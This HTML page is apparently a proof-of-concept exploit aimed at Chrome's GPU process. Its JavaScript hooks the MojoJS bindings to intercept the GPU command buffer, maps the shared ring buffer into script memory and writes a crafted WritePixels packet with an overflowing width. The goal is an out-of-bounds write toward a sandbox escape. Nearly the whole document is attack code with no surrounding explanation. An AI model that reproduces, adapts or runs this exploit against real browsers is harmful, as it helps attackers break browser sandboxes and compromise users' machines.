<!DOCTYPE html>
<html>
<head>
    <title>GPU Sandbox Escape PoC</title>
    <!-- Load Chrome's internal Mojo bindings -->
    <script src="/gen/mojo/public/js/bindings.js"></script>
    <script src="/gen/gpu/ipc/common/gpu_channel.mojom.js"></script>
</head>
<body>
    <h1>GPU OOB Write PoC via MojoJS</h1>
    <canvas id="target-canvas" width="10" height="10"></canvas>
    
    <script>
        // 1. The Payload Builder (Constructs the 60-byte binary packet)
        function buildMaliciousWritePixels(shm_id) {
            const CMD_ID = 277; // kWritePixelsINTERNALImmediate
            const WORDS = 15;   
            let buffer = new ArrayBuffer(WORDS * 4);
            let dv = new DataView(buffer);
            
            dv.setUint32(0, (WORDS << 21) | CMD_ID, true); // Header
            dv.setInt32(4, 0, true);   // x_offset
            dv.setInt32(8, 0, true);   // y_offset
            dv.setUint32(12, 0x20000000, true); // OVERFLOW TRIGGER: src_width
            dv.setUint32(16, 1, true); // src_height
            dv.setUint32(20, 0, true); // src_row_bytes
            dv.setUint32(24, 4, true); // src_sk_color_type
            dv.setUint32(28, 2, true); // src_sk_alpha_type
            dv.setInt32(32, shm_id, true); // shm_id
            dv.setUint32(36, 0, true); // shm_offset
            dv.setUint32(40, 0, true); // pixels_offset
            
            let u8_view = new Uint8Array(buffer);
            u8_view.fill(0, 44, 60); // Empty Mailbox
            return u8_view;
        }

        let ring_buffer_memory = null;
        let command_buffer_proxy = null;

        // 2. Intercept Mojo Interface
        const original_bind = Mojo.bindInterface;
        Mojo.bindInterface = function(interfaceName, pipe, host) {
            if (interfaceName === "gpu.mojom.CommandBuffer") {
                console.log("[+] Intercepted CommandBuffer creation!");
                
                // Bind our own proxy to the pipe so we can listen to the setup
                command_buffer_proxy = new gpu.mojom.CommandBufferProxy(pipe);
                
                // We wrap the Initialize function to steal the shared memory buffer
                const original_initialize = command_buffer_proxy.initialize;
                command_buffer_proxy.initialize = async function(route_id, shared_state, ring_buffer) {
                    console.log("[+] Stealing ring buffer handle...");
                    
                    // Duplicate the shared memory handle before passing it on
                    const duplicated_handle = ring_buffer.duplicateBufferHandle();
                    
                    // Map the GPU ring buffer into JavaScript memory!
                    // We map 1MB (1048576 bytes) which is standard for the ring buffer
                    const map_result = duplicated_handle.mapBuffer(0, 1048576);
                    ring_buffer_memory = new Uint8Array(map_result.buffer);
                    console.log("[+] Ring buffer mapped to JS successfully!");
                    
                    // Resume normal execution
                    return original_initialize.apply(this, arguments);
                };
            }
            return original_bind(interfaceName, pipe, host);
        };

        // 3. Trigger Canvas Creation to force the Mojo Handshake
        setTimeout(() => {
            console.log("[*] Initializing Canvas...");
            const canvas = document.getElementById('target-canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillRect(0, 0, 10, 10);
            
            // 4. Inject Payload into the mapped memory
            setTimeout(() => {
                if (ring_buffer_memory) {
                    console.log("[!] Injecting Malicious WritePixels Packet...");
                    
                    // Build the packet. We pass 1 as the shm_id (usually the transfer buffer)
                    let payload = buildMaliciousWritePixels(1);
                    
                    // We write our packet at offset 0 of the ring buffer
                    ring_buffer_memory.set(payload, 0);
                    
                    // Tell the GPU process to read the command we just wrote
                    // command_buffer_proxy.flush(15); 
                    
                    console.log("[!] Payload injected! Check if the GPU process crashed.");
                } else {
                    console.log("[-] Failed to map ring buffer. The Mojo interface might be named differently in this Chrome version.");
                }
            }, 1000);
        }, 1000);
    </script>
</body>
</html>
